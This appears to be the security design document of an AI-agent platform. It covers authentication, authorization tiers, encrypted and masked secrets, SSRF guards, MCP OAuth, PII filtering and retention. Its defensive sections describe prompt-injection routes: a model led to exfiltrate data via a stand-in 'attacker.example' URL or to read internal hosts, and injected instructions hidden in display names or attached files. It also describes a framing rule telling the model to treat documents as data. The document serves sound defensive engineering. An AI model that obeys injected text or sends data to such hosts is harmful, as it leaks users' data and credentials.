# Security

Who may do what, how credentials are stored and handed out, and where the boundaries are
that this app enforces — and where they end.

Related: [CONFIGURATION.md](CONFIGURATION.md) for the variables named here,
[API.md](API.md) for per-endpoint authorization, [ARCHITECTURE.md](ARCHITECTURE.md) for how
the pieces fit together.

## Authentication

Better Auth 1.6 with **Google OAuth only**, over a custom DynamoDB adapter on the single
table (`src/infrastructure/db/authAdapter.ts`). Sign-in is restricted to
`ALLOWED_EMAIL_DOMAINS`; an empty list allows any domain, which `STAGE=alpha|prod` refuses
to boot with (see [Boot-time validation](CONFIGURATION.md#boot-time-validation)).

Auth unique fields (email, token) are claimed transactionally with a dedicated lock item
rather than checked-then-written. `GSI2` remains as a compatibility lookup for rows created
before the locks existed.

The admin-only member list reads Better Auth user rows. `createdAt` is the join time;
`lastLoginAt` is updated after successful session creation. Older users have no last-login
value until they sign in again. A failed timestamp update is logged but does not turn a
successful identity-provider login into an authentication failure.

### Two gates, on purpose

| Surface | Gate | What it decides |
|---|---|---|
| Pages | `src/proxy.ts` | Redirect a signed-out visitor to `/login?next=…` |
| API routes | `withAuth` / `withAdminAuth` (`src/lib/session.ts`) | 401 without a session; hands `SessionUser` to the handler |

`src/proxy.ts` is the single owner of which pages are public — `/` and `/login`. Everything
else the matcher reaches needs a session, so **a new route defaults to protected**. That
direction is deliberate: forgetting to list a public page produces a redirect a user reports
in a minute, while forgetting to list a private one fails silently.

The page gate checks the *presence* of the session cookie, not its validity. Verifying it
would mean a session read on every navigation and still would not be the authorization
decision — that stays server-side in `withAuth` and `assertProjectWritable`, which see the
request that actually touches data. A present-but-invalid cookie therefore reaches the page
and gets its 401 from the API behind it; what the gate removes is the ordinary signed-out
case, which used to hand a visitor the whole console plus an error box.

`/api` is outside the matcher: those routes authenticate themselves and must answer a
programmatic caller with a 401, never an HTML redirect.

The `next` parameter arrives from the address bar, so `/login` reads it back through
`safeNextPath` (`src/shared/safeNextPath.ts`). `//host` and `/\host` have to be rejected or
the sign-in flow becomes an open redirect.

A refusal travels back out through the same address bar. Better Auth builds the browser's
`error` parameter from the thrown error's *message*, so that message is a wire format rather
than prose — a sentence written there lands in the URL, which is how the deployment's
allowed-domain list used to reach whoever had just been turned away. The codes live in
`src/shared/signInError.ts` instead (`EMAIL_DOMAIN_NOT_ALLOWED` is the only one this app
raises), and `/login` maps them to copy it owns. An unrecognised value collapses to one
generic line **rather than being echoed**: the parameter is server text, and a deployment
redirected before that mapping existed can still send a whole sentence naming its domains.
The codes Better Auth raises on its own — a cancelled consent screen, a stale callback —
differ in ways only a server log can act on, so they collapse too.

## Authorization model

**Projects are a shared catalog.** Any signed-in user may read and run any project. Only
mutations are gated.

| Resource | Read | Write |
|---|---|---|
| Project, versions | any signed-in user | owner or configured admin (`assertProjectWritable`) |
| Project traces | owner or configured admin | — |
| Project Slack config | owner or configured admin | owner or configured admin |
| Project API token, triggers, MCP connections | owner or configured admin | owner or configured admin |
| Per-caller usage (`usage/actors`) | owner or configured admin | — |
| Project usage totals | any signed-in user | — |
| Skills / MCP servers / external agents | any signed-in user | admin (`withAdminAuth`) |
| App settings | admin | admin |
| Member directory | admin | admin (tier changes, audited as `member.set-tier`) |
| Chats | owner only (non-owner reads 404) | owner only |

Traces and the Slack config are gated on *read* as well because they expose other users'
runtime inputs/outputs and masked credential edges. Project *totals* stay open because the
catalog is shared; a breakdown by caller names individuals, so `usage/actors` does not.

### `isAdminEmail` vs `isConfiguredAdmin`

Two different admin questions, both in `src/lib/runtime-settings.ts`, and they must not be
swapped:

| Predicate | Question | Empty `ADMIN_EMAILS` means |
|---|---|---|
| `isAdminEmail` | May mutate shared registries and app settings? | **no restriction** — any signed-in user |
| `isConfiguredAdmin` | May write a project owned by someone else? | **nobody** |

Using the first for project ownership would hand every signed-in user write access to every
project on a deployment that never set `ADMIN_EMAILS`. Both flags are sent to the browser by
`GET /api/me` — as `isAdmin` and `isConfiguredAdmin` — because the console gate for "may I
edit this project" must mirror `assertProjectWritable` exactly: reading `isAdmin` there once
offered every user an edit form for every project, and every save 403'd.

**Member tiers add a second source, never a second predicate.** A member whose stored `tier`
is `admin` gets what *both* predicates grant; the composition is `src/lib/memberAccess.ts`'s
alone (`isEffectiveAdmin` / `isEffectiveConfiguredAdmin`), and the two list predicates above
keep their empty-list semantics byte-for-byte — `ADMIN_EMAILS` stays the bootstrap and the
backstop, which is also why a tier self-demotion needs no guard: a tier change alone can
never lock the console. The tier lives on the Better Auth user row (`input: false`, so no
auth API lets a user set their own), is written only by `memberRepository.setTier`'s
single-attribute conditional update, and reaches route handlers on the session — fresh every
request. The seams that never see a session (the project-write override, the run bracket's
guards) resolve email → tier through a 30-second per-instance cache, invalidated on the
instance that served a tier change. What each tier may hold in flight, spend per UTC month,
and do (create projects, use API tokens) is `TIER_LIMITS` in `src/domain/member/tiers.ts` —
gates go through its `tierMay*` predicates, never tier-name comparisons. Project creation
additionally passes for an effective admin whatever their stored tier reads as — tier is
additive to permissions, and the `ADMIN_EMAILS` bootstrap admin's row defaults like
everyone else's.

The monthly cap sums the member's own daily rows from the first of the UTC month, the same
window and the same rows the profile page reads — one aggregate, so a page cannot report a
total the guard would disagree with. The person-shaped limits bind `user` actors only. Machine callers (Slack, A2A, webhook,
schedule) have no member; a **project token** carries its owner's email but deliberately
spends against its *project's* limits, not the owner's personal budget — a token is a
service credential. What keeps that from being a bypass is the token gate: a tier without
API-token rights can neither issue a token (owner-scoped, admin included) nor authenticate
with an existing one — `authenticateExecution` re-checks the owner's current tier on every
bearer request and answers 403, so a demotion stops the owner's tokens immediately. Both
checks fail open when the tier cannot be read: a storage blip must not take every token
down, the same posture as every other guard's own read.

The admin override is checked *inside* `assertProjectWritable` rather than threaded in by its
twenty-odd callers: the rule is "owner or admin", and a flag one caller forgot to pass would
silently narrow it back to owner-only on that path alone. The function is named for that rule
and not for the owner — anything that genuinely needs **ownership** (attribution, whose
credentials to dispatch with, whom to notify) reads `project.ownerEmail`.

Two consequences of the override are handled rather than assumed away:

- It is **recorded** — an `project.admin-override` audit row and the
  `[authz] admin … is acting on project …` line — because the write can destroy the row that
  would have identified who made it, and a project's API token authenticates *as its owner*,
  so an admin reveal leaves that pair plus a `secret.reveal` row.
- The settings read it needs **fails closed**: a settings-store outage denies the override
  rather than turning a non-owner's deterministic 403 into a 500.

## Secrets at rest

Every stored credential — MCP server headers, external-agent headers, per-version header
overrides, Slack bot token and signing secret, the app-wide A2A key, project API tokens,
webhook trigger secrets — is AES-256-GCM encrypted with `AES_ENCRYPTION_KEY` and stored
under an `enc:v1:` prefix (`src/infrastructure/crypto/secretEncryption.ts`).

### Masking on read

Reads return a **length-preserving mask**, so the console can show *which* credential is set
without showing it:

| Plaintext length | Revealed |
|---|---|
| < 9 chars | nothing (`*` × length) |
| 9–20 chars | first 2 and last 2 |
| ≥ 21 chars | first 4 and last 4 |

The two revealed edges are never allowed to meet. Revealing edges needs the plaintext, so
masking decrypts — only inside the admin/owner-gated read views that call it, and a
decryption failure hides the value entirely rather than erroring. A value short enough that
nothing would be revealed is never decrypted at all, decided from the ciphertext length
(AES-GCM preserves plaintext length).

### Masks on write

A masked or empty value on update **preserves the stored secret**; a masked value under a key
with no stored counterpart is **dropped**. A mask can only confirm an existing secret, never
create one. `null` in a header-override map passes straight through as an explicit removal —
a removal is not a secret.

### Reveal endpoints

Four secrets this app issues can be read back in plaintext:

| Secret | Endpoint | Who |
|---|---|---|
| App-wide A2A key | `POST /api/settings/a2a-key/reveal` | admin |
| Named A2A client key | `POST /api/settings/a2a-keys/{name}/reveal` | admin |
| Project API token | `POST /api/projects/{name}/token/reveal` | owner or admin |
| Webhook trigger secret | `POST /api/projects/{name}/triggers/{trigger}/reveal` | owner or admin |

All four are **POST although they read**: the response body is a live credential, so it
stays out of caches, browser history and prefetches. Every reveal leaves an **audit row** with
the caller's email, and the server-side log line beside it — the row is what a later question
queries, the line is what survives the audit store itself being unavailable.

These four are therefore stored **encrypted rather than hashed**, which is a deliberate
trade: the datastore alone is not enough to use one, but the datastore *plus*
`AES_ENCRYPTION_KEY` is. **Treat that key as the thing standing between a table dump and
live project credentials.** Project tokens issued before revealing existed are stored as a
SHA-256 hash instead — they still verify, but cannot be shown again, so the console offers
regeneration.

### Generated secret prefixes

Secrets AgentDure issues carry a prefix naming product and kind
(`src/shared/generatedSecret.ts`), the way `ghp_`/`gho_` do for GitHub, so a leaked string is
traceable to what it opens:

| Prefix | Secret |
|---|---|
| `ada_` | app-wide A2A key (admin-managed) |
| `adc_` | named A2A client key (admin-managed) |
| `adt_` | project API token (owner-managed) |
| `adw_` | webhook trigger secret (owner-managed) |

The random part is 32 bytes (256 bits), so the prefix costs no entropy that matters.
Verification never looks at the prefix, so tokens issued under an older spelling — `as*_`,
and `sk_proj_` before it — keep working.

A project token's display mask is computed at generation and stored beside the ciphertext, so
listing a token costs no decryption; the mask carries only the prefix and the edge characters,
never enough to reconstruct the token.

## Request authentication for machine callers

Five credentials authenticate a caller with no session cookie:

| Surface | Credential | Verification |
|---|---|---|
| Execution endpoints (`predict`, `chat/completions`, `agent`) | `Authorization: Bearer adt_…` | Decrypt-and-compare in constant time (or hash compare for a legacy token), scoped to the `{name}` in the path; runs **as the project owner** (`authenticateExecution`) |
| Slack events | Slack signing secret | HMAC + `timingSafeEqualString`, 5-minute replay window, per-project secret |
| Inbound A2A | `X-A2A-Key` | Constant-time compare against the shared `A2A_API_KEY` (actor `a2a:shared-key`), else a hash lookup against the admin-issued **named client keys** (actor `a2a:{client}` — attributed and rate-limited per client). With neither configured the endpoints are off |
| Webhook triggers | `X-Trigger-Secret` | `cipher.decryptEquals` (constant time) |
| CronJob ticks — schedule scan (`/api/triggers/scan`), catalog reindex (`/api/catalog/reindex`), plugins sync (`/api/plugins/sync/scan`) | `X-Scan-Token` | `timingSafeEqualString` against `SCHEDULE_SCAN_TOKEN`; unset answers 503, and a refused token logs a warning on all three |

**One token opens all three ticks**, which makes it the widest of the five. The same string
that lets a CronJob ask which schedules are due also runs a plugins sync, and that sync
writes both registries — skills and MCP servers — adopting names the repository declares and
rewriting provenance with them. Scope and rotate it as a write credential, not as a probe.

One sibling carries no credential at all: a published project's A2A **Agent Card**
(`/.well-known/agent-card.json`) is served to anyone once the surface is enabled — a shared
`A2A_API_KEY` or at least one named client key — because that is what makes the agent
discoverable, and the A2A handshake starts with the card. It exposes the project's name,
description and skills; invoking the agent still takes a key.

The trigger secret is compared **before** the enabled flag is read, so a disabled trigger
cannot answer a wrong secret differently from an enabled one — that difference is an oracle
for which triggers exist.

Constant-time comparison has one owner, `src/shared/timingSafe.ts`, pinned by
`tests/architecture.test.ts`.

Replay protection: Slack events are deduplicated exactly-once by `event_id` (conditional put,
24h TTL) whose claim is a **lease** settled afterwards, so an instance that dies mid-processing
leaves a reclaimable claim rather than an event recorded as handled by nobody. Webhook
deliveries claim their `Idempotency-Key` the same way.

## Response headers

Set in `next.config.ts` for every path. `frame-ancestors 'none'` and `X-Frame-Options: DENY`
because the console has buttons that delete an artifact and rotate a key, and a framed page is
how a click on one gets collected. `X-Content-Type-Options: nosniff` because one route answers
`text/html` and puts an authorization server's words on it. `Referrer-Policy:
strict-origin-when-cross-origin` because a URL here is often itself the credential — a signed
object address, a webhook path — and a full referrer hands it to whatever the reader clicks
next.

**No Content-Security-Policy yet.** Mantine and Next both emit inline styles, so a useful
policy needs a nonce pipeline; a wrong one breaks the console silently, which is worse than
the absence. Until then nothing here is a second line of defence against an injected script —
the escaping at each sink is the only one.

## Outbound requests (SSRF)

Operator-registered URLs — MCP servers and external agents — are validated by
`src/infrastructure/net/ssrfGuard.ts` at **both registration and dispatch**. Rejected:
non-`http(s)` schemes, URLs carrying userinfo (`https://user:pass@host` — a credential in the
address is not how anything here authenticates, and it is a standing way to make a host read
as something else), and hosts resolving to private, loopback, link-local (including the
`169.254.169.254` cloud-metadata address) or otherwise reserved ranges.

Dispatch goes through `fetchPublicUrl` (`src/infrastructure/net/publicFetch.ts`), which is
the single outbound boundary:

- DNS is re-resolved and re-checked on **every request and every redirect hop**, narrowing
  (though not fully closing) the DNS-rebinding window between registration and use.
- The connection is pinned to the checked address.
- Native redirect-following is disabled and **cross-origin redirects are refused**, so stored
  credentials cannot be forwarded to another host.
- Dispatchers are pooled per `origin|pinned address` for connection reuse. This caches
  **transport only** — the guard still runs per request, so a host that starts resolving
  privately is rejected before a pooled dispatcher is reached, and a host resolving elsewhere
  gets a different key.

Any public URL is allowed. Register only trusted endpoints.

The MCP client runs on `@modelcontextprotocol/client`, and the guard is **injected into it**
rather than sitting beside it: `boundedFetch` (`src/infrastructure/mcp/session.ts`) is what the
transport is given as its `fetch`, so the probe, the handshake, every tool call and the session
release all go through the same boundary. An SDK left to its own `fetch` would take an
operator-supplied URL straight to the network. The same wrapper carries the response byte
ceiling, which the SDK also has no notion of.

### Declared internal hosts

On a cluster, the MCP servers this app is *meant* to call are private by
construction — a Kubernetes Service resolves to a ClusterIP the guard rejects.
`MCP_INTERNAL_HOST_SUFFIXES` is how a deployment says which names those are:

```
MCP_INTERNAL_HOST_SUFFIXES=agent-mcps.svc.cluster.local
```

A host under a declared suffix skips the public-URL guard everywhere the
question is asked — registering an entry and editing one, the console's "Test
connection" probe, an admin reading the entry's OAuth metadata, a project's own
tool list, and dispatch — each through `skipsUrlGuard`. **The blocked address
ranges are not widened** — every other entry still faces the check it did. This
is a second narrow exception alongside managed loopback, not a loosening of the
guard.

Its narrowness is the whole design, and each part is pinned by
`tests/internalHosts.test.ts`:

- **Configuration only.** The list comes from the environment. A registry entry
  cannot name its own exemption, and it is deliberately *not* a runtime setting:
  widening the outbound boundary should take a deploy, not a form submitted by
  whoever holds admin at the time.
- **Label-anchored.** `agent-mcps.svc.cluster.local` admits
  `mcp-url-fetch.agent-mcps.svc.cluster.local` and refuses
  `evil-agent-mcps.svc.cluster.local` — the near-miss that a plain "ends with"
  would let through. A leading dot is accepted and means the same thing.
- **No single-label suffix.** `local` or `internal` would admit a whole namespace
  of names; far more likely a typo than an intent, so it is not honoured.
- **Never an IP literal.** The exemption is for a name someone published. An
  address has no name to match, so a private address still has to earn its way
  through provenance.
- **`http(s)` only**, and userinfo cannot smuggle the suffix past the host check.

What it costs: a host under that suffix is reachable by any URL an admin can
store, which is the capability the guard otherwise removes. Keep the suffix as
specific as the namespace you actually run those servers in.

### The managed-loopback exception

A managed MCP server (`runtime: "managed"`) is a container this app started on its own host
and reaches at `127.0.0.1:<port>` — an address the guard correctly rejects for anything an
operator types. Trust rests on **provenance** instead: the provisioner recorded that address
after binding the port.

`isManagedLoopback` (`src/domain/mcp/types.ts`) is the only place that decides the bypass
applies, and it is narrow on purpose. The entry must claim `managed` **and** carry a literal
loopback address:

- A hostname that resolves to `127.0.0.1` is refused — it can resolve elsewhere between check
  and request.
- A `remote` entry pointing at loopback is refused — that address was typed.
- The registry refuses to move a managed entry's URL.
- The lifecycle use case refuses to store a non-loopback address even when the provisioner
  reports one, and stops the container it named.

The provisioner takes an image reference, a port and an optional **argv array**, never a
shell command. The local adapter passes argv directly to Docker; the SSM adapter shell-quotes
every argument before assembling its command.

### What an MCP server is told about the caller

Every request a run makes to an MCP server carries `X-Tenant-Id` with the calling project's
name (`TENANT_ID_HEADER` in `src/application/execution/mcpTools.ts`). It exists so a
multi-tenant server — mcp-memory scopes its data by it — works per project with no
per-project registration; a server that does not read it ignores it, and one that already
treats `X-Tenant-Id` as its tenancy switch acts on ours, which is the point of the generic
name. It is applied *after* the registry/binding header merge, in any spelling, so a
version's overrides cannot impersonate another project's tenant, and it rides in the
session's header map so the discovery cache stays keyed per project. The catalog reindex
probe and "Test connection" carry no project and send no header — a server that requires one
refuses those listings and is indexed at server level only.

The console's per-project tool list (`listTools` in `src/application/mcp/mcpAuthUseCases.ts`)
is the one probe that *has* a project and still sends no tenant: it resolves that project's
OAuth token and assembles the same headers a run would, minus this one. On a server that
exposes different tools per tenant, the list an owner is shown is therefore not necessarily
the list their run is offered.

That header is the **only** identity metadata sent automatically, and its value is the
project name — never a user's name or email. What a server can learn beyond it is
(a) whatever the model writes into tool arguments — see *PII filtering, and where it
stops* — and (b) for OAuth entries, that the registered client is named
`AgentDure — <project>` and that the token carries the grant of whoever connected the
server.

### URLs the model chose

Everything above concerns addresses an **operator registered**, where validation at
registration is the first control and the dispatch check is the second — narrowing, not
closing, the window between them. The `FetchUrl` builtin has no first control: the model names
the address, and a model is talked into things by the text it reads. `src/infrastructure/net/httpResource.ts`
is the only place such an address is requested, and its rules are load-bearing rather than
defence in depth:

- **The internal-host exemption is never consulted.** `MCP_INTERNAL_HOST_SUFFIXES` exists so
  this app can reach its own cluster MCP services. Honouring it here would turn one prompt
  injection into a read of `http://mcp-argocd.agent-mcps.svc.cluster.local/`.
  `tests/architecture.test.ts` fails if the adapter so much as imports `skipsUrlGuard`.
- **Nothing authenticates.** No tenant header, no MCP OAuth token, no Slack token, no caller
  headers forwarded. Always GET, never a body. A cross-origin redirect cannot forward what was
  never attached — and `fetchPublicUrl` refuses one anyway.
- **Refusals are generalised.** `PublicFetchError` names the host it refused; handing that to a
  model turns the tool into an oracle for which internal names exist. The caller gets "that
  address is not reachable from here" and the detail goes to the log, origin only — a URL is
  often itself the credential.
- **Bounded per run.** `MAX_URL_FETCHES_PER_RUN` (20) caps the *number* of requests, which no
  other budget does. "Many requests, all failing" is the shape a network sweep takes.
- **Off by default.** A version opts in with `parameters.urlFetch`; the capability is derived
  from the injected dependency, so the Playground preview and the run cannot disagree.

**What this does not stop.** A host that is public but sensitive — an IP-allowlisted SaaS that
trusts the pod's egress address — passes the guard. So does exfiltration: a model talked into
requesting `https://attacker.example/?leak=…` is making an ordinary outbound request, and PII
filtering does not help, because the fetch needs the *restored* argument (a masked URL does not
resolve). This is the same limit already stated for MCP tool arguments below; the difference is
that a URL is a lower-friction channel.

**And what it costs.** This exposure existed before, in a separate pod with no credentials of
its own. It now runs in the app process, which holds the AES master key, the DynamoDB role and
the Slack tokens — so the blast radius of any SSRF-adjacent defect is larger, and the app's
egress policy has to be wide enough to reach the open web. Mitigated, not removed.

## MCP OAuth

Registry entries may carry an `auth` block discovered once at registration (RFC 9728
protected-resource metadata → RFC 8414 authorization-server metadata). Every endpoint taken
out of either document is re-validated through the URL policy and required to be `https`.
**The run path never fetches a well-known document.**

The resource document is read from the entry's own address, so a
[declared internal host](#declared-internal-hosts) is read the same way a run dials it. The
**authorization server is not** — that URL comes out of a third party's document rather than
the registry, and an operator declaring an MCP host internal says nothing about an
authorization server that host names for itself.

Credentials are **per project**, in their own `PROJECT#<name> / MCPCONN#<server>` item — not
on the version (a snapshot of configuration history) and not on the project item (whose
`updatedAt` is the optimistic-concurrency condition for publish). That split is what lets one
shared registry entry serve a different provider app per project.

Enforced properties:

- **PKCE S256 is mandatory.** `state` is single-use with a 10-minute TTL.
- **RFC 8707 `resource`** is sent on every authorization and token request. The spec makes it
  unconditional, and it is what stops a token issued for one MCP server being replayed
  against another.
- **RFC 9207 `iss`** is validated before the code is redeemed (SEP-2468). The expected issuer
  is recorded on the pending-state item beside the PKCE verifier — *not* read back off the
  registry entry, which a re-discovery may have changed — and compared **literally**: no case,
  port, trailing-slash or percent-encoding normalisation, each of which is another way for two
  issuers to compare equal. A missing `iss` is fatal only where the server's metadata
  advertises `authorization_response_iss_parameter_supported`. The same check runs on error
  responses, so provider-controlled `error_description` text is never relayed from a redirect
  this app cannot attribute.
- **Issuer binding on the credentials** (SEP-2352): a connection's client credentials carry
  the issuer they were registered with, and its tokens carry the `resource` they were minted
  for. Both are checked before anything is handed out — on the refresh path *and* on the path
  that only reads a live token, because a bearer token has an audience and serving one
  unchecked is the same mistake as spending the client secret.
- **Editing an entry's URL drops its `auth` block outright.** The block was read out of the
  old address's well-known documents. The entry falls back to its own headers until an admin
  re-runs Discover; once they do, the two checks above catch every connection that belonged to
  the old server. Deleting and recreating an entry under the same name is caught the same way
  — which matters, because the registry is admin-owned while connections are owner-owned and
  the only thing joining them is the name.
- **How a client is obtained**: credentials already held (entered by hand), then a Client ID
  Metadata Document, then an error naming what the owner has to do. **Dynamic registration
  (RFC 7591) is not implemented** — the revision deprecates it, and what it automated is a
  one-time step an owner can do themselves. A public client with no secret sends `none`
  whatever the server's metadata preferred.
- **A Client ID Metadata Document is served publicly, per project**, at
  `/api/mcps/oauth/client-metadata/{project}` — the one MCP route with no session check, and
  deliberately so: the reader is an authorization server resolving a `client_id` that is a
  URL, arriving from wherever the provider runs with no cookie. Nothing in it is a secret; it
  states this deployment's name and the one redirect URI it accepts, which is what
  registration used to send in a POST body. The `client_id` inside must equal the URL it was
  fetched from, so both are built by one function (`clientMetadataUrl` /
  `clientMetadataDocument`) from the **configured** public base — never from the request,
  which would let a caller publish a document authorizing a redirect to its own host. The
  project is not looked up: a public endpoint that reads the database per request invites
  unauthenticated traffic into it, and a 404 for an unknown name would leak which projects
  exist. A document for a project that does not exist is inert — the authorization it could
  start lands at the callback, which finds no connection and stops.
- **Such a client is public by construction**, so the flow's defence is PKCE plus that fixed
  redirect URI rather than a shared secret: an authorization anyone else starts still delivers
  its code to this deployment's callback, where it is useless without the verifier.
- **The issuer-binding rule above inverts for it.** A hand-entered `client_id` is meaningless
  away from the server that issued it, which is why it is keyed by issuer — and, since nothing
  re-issues one now, an entry that moves to another authorization server is refused with the
  server the owner has to register with named. A metadata-document `client_id` is self-hosted
  and resolved on demand by whichever server is asked, so it survives the move — refusing it
  would break a working connection over credentials it does not have.
- The callback **re-checks project ownership**, because it can change while the user is at the
  provider.

Refresh is a compare-and-set on the stored refresh token: providers that rotate them revoke
the previous one, so the loser of a race uses the winner's token. Only a **refused grant**
marks a connection `needs_reauth`; a 5xx or timeout leaves it alone. (Refresh timing is a
design constraint rather than a security one — see
[ARCHITECTURE.md](ARCHITECTURE.md#oauth).)

A connection **supplies** credentials rather than gating the server. The resolved token is
applied last at dispatch — over the registry entry's headers and the version's overrides — so
a version cannot substitute its own `Authorization` for the project's connection. When no
connection is available, the server still runs on whatever those headers hold; it is dropped
with a warning only when they hold nothing.

## PII filtering, and where it stops

Opt-in per version via `parameters.piiFiltering`. Emails and phone numbers in outbound
messages and variables are replaced with reversible, format-preserving `[[PII:…]]` tokens
before every LLM dispatch, and the originals are restored in responses — streaming included,
with token-boundary buffering — so the model never sees the real values. The mapping carries
across subagent transfers.

**The boundary is the LLM channel and the engine's own context, not every outbound call.**
When the model invokes an MCP tool, `callMcpTool` receives the **restored** arguments — a tool
asked to email `a@b.com` needs the address, not a token. A connected MCP server therefore
still sees the PII it is passed. (A subagent transfer is the opposite: the child agent
receives the masked message.) Review MCP server registrations on their own terms;
`piiFiltering` does not cover them.

**Capability discovery is outside it too, and for a structural reason.** A version with
`dynamicCapabilities` on searches the catalog with the newest user turns (a short window,
not just the last) among its queries, and that text goes to the embedding provider *verbatim* —
`resolveRunTools` runs
before `engine.runAgent`, which is where the filter is constructed and the only place that
owns how a run masks. So a request carrying a phone number reaches Bedrock or the configured
`/embeddings` endpoint unmasked even with filtering on, one call ahead of the dispatch that
would have masked it. In practice that is the same provider account the chat channel already
uses, which is why it is documented here rather than treated as a separate exposure — but it
is a decision to make when turning the flag on, not something the filter covers. A deployment
that cannot accept it leaves `dynamicCapabilities` off on filtered versions, which is the
default.

Detection is regex-based and covers emails, phone numbers, Korean resident/foreigner
registration numbers (hyphenated form, with the date half validated) and payment card
numbers (13-19 digits, Luhn-checked so an order id is not masked *as a card* — a span that
fails the check is re-scanned by the other patterns, keeping whatever the phone pattern
masked before the card entity existed). Treat it as best-effort masking, not a guarantee.
Off is byte-identical to the unfiltered path.

## Caller context

Opt-in per version via `parameters.callerContext`. With it on, a Slack run tells the model who
is asking — display name, timezone, and the avatar's URL — and labels each speaker when a thread
holds more than one human.

**A name is PII that `piiFiltering` does not mask.** Its patterns match emails, phone and
registration/card numbers,
and a person's name matches neither, so anything the caller block carries reaches the model as
written even with filtering on. That is why the block carries **no email**, and why this is a
per-version opt-in rather than default behaviour: turning it on is a decision to put real
people's names into prompts and into whatever the provider logs.

The opt-in gates the lookup as well as the prompt. A version with it off causes no `users.info`
call at all, so a project that has not opted in never sends a member's id to Slack's profile
API. A **transfer carries the caller** to the child (`RunOrigin`), where the child version's
own opt-in decides again — so a name reaches only versions that asked for one, however many
hops away, and a project whose owner never opted in never sees it. Resolved profiles are cached in memory per workspace (an hour; a failure, a minute), bounded
in size, and never persisted.

**A display name is attacker-controlled.** Anyone can set their own to anything, and it lands in
the system prompt — through the speaker labels on a shared thread, in *other people's*
conversations, not only their own. `callerFrom` (`src/domain/execution/actor.ts`) is the single
place a `RunCaller` is built and therefore the single place its name is made safe: control
characters are stripped, whitespace is collapsed to one line, the name is bounded at 60
characters, and an avatar is accepted only if it is an `https:` URL. That does not make prompt
injection impossible — the message body is untrusted too — but it stops identity metadata from
being a place to hide instructions a reader cannot see.

## Attached documents

A document's text goes into the turn, so **anything anyone can attach can say anything**. In a
Slack channel that is not only the person asking — it is whoever can drop a file where the bot
can see it.

What is done about it: every document is wrapped by `framedDocument`
(`src/application/llm/documentParts.ts`), which names the file, marks where it ends, and tells
the model to treat the span as data and never as instructions. The name is JSON-escaped so a
crafted filename cannot forge the end marker.

**That is a mitigation, not a fix.** No wording makes injected text safe, and the message body
was already untrusted. Size an agent's authority to it: one that reads attachments should not
hold permissions you would not give to a stranger with a file.

Other properties worth knowing:

- **Documents are read, never executed or rendered.** Extraction yields text and nothing else;
  HTML is read as its markup rather than fetched, scripted or resolved.
- **Nothing fetches on the document's behalf.** A URL inside an attachment is text like any
  other; only a tool the version bound can act on it, under that tool's own guard.
- **Text goes through the PII filter** like the rest of the turn when the version opts in —
  with the same limits (emails, phone numbers, Korean registration numbers and card
  numbers — not names).
- **Chats store the extracted text, not the file**, under the chat's own retention and the
  owner-private read rule. A 10MB PDF is never persisted; up to 40,000 characters per turn of
  what was read is.

## Data exposure and retention

- Traces store **bounded metadata only** — character counts, tokens, cost, duration, subagent
  trace ids. Raw prompts and tool results are not persisted, but a trace's `error` and
  `warnings` keep up to 1,000 characters of failure text verbatim, and a provider or tool
  error string can embed content.
- `/api/metrics` names no project, user or model. The only label any metric carries is a
  histogram's `le`.
- Log lines carry a run correlation id, never prompt content.
- Traces, usage rows, chats, trigger deliveries and inbound A2A tasks all expire via DynamoDB
  TTL — see [OPERATIONS.md](OPERATIONS.md#row-retention).
- **Generated images** are stored under an unguessable UUID key with `S3_BUCKET_NAME` set, and
  a chat row keeps the **object key** — never an address. URLs are pre-signed at read time with
  a lifetime chosen for the reader: 15 minutes for the chat view, and the whole run deadline
  plus a margin for a replay, because that URL is fetched by the *model provider* at whatever
  point in the run it reaches the turn. The bucket therefore does not need to be public-read,
  and a transcript no longer carries a link that works forever for anyone who sees it.
  - Rows written before this carry a public `url` and are read back unchanged. Rewriting them
    would change nothing about who can reach those objects, which are already public — so
    **if the bucket was ever public-read, its existing objects still are.** Making it private
    is the operator's step, and old rows stop resolving when it happens.
  - **Nothing in the app expires an object.** DynamoDB TTL removes a row silently — the app
    never observes the expiry — so only the bucket can expire objects on the same clock.
    Attach a lifecycle rule per prefix; it is on the deployment checklist in
    [OPERATIONS.md](OPERATIONS.md#operational-checklist-for-a-new-deployment).
- **Artifact rows** name every object a run produced, which is what makes a stored image or
  document listable and removable at all. Three consequences worth stating:
  - A row keeps a **500-character excerpt of the prompt** so a gallery is legible. That is user
    text living for `ARTIFACT_RETENTION_DAYS`, past the chat message that carried it. PII
    filtering bounds what the *model* sees, never what is stored.
  - A project's artifacts tab is readable by the project's owner and by admins — the same rule
    traces use, and for the same reason (they hold other people's runtime output). It is a
    wider exposure than traces in practice: traces are sampled and keep 30 days, artifacts are
    every object and keep 180.
  - Deleting an artifact removes the object first and the row second, so an interrupted delete
    converges on retry. A chat message keeps its own copy of the key, so the transcript renders
    the image as unavailable afterwards; the confirmation says so before the fact.

## Operational notes

- **Rotate, don't just edit.** A leaked A2A key, project token or trigger secret is rotated
  from the console (`POST …/a2a-key`, `POST …/token`, `PUT …/triggers/{id}` with
  `rotateSecret: true`); the previous value stops working immediately.
- **Settings propagation is not instant.** A demoted admin or a rotated A2A key keeps working
  on instances that did not serve the write until their settings cache expires
  (`SETTINGS_CACHE_TTL_MS`, default 5s). Immediate cross-instance revocation would need a
  shared invalidation signal, which does not exist yet.
- **Auth rate limiting keys on the client IP**, which behind proxies is resolved through
  `TRUSTED_PROXY_CIDRS` — see
  [CONFIGURATION.md](CONFIGURATION.md#authentication-and-access-control). Left empty behind
  two proxies, every request resolves to the same hop and falls into one shared bucket, so
  the limiter throttles the fleet rather than an abuser.
- **AWS credentials come from the task/instance role** — never bake keys into the image.
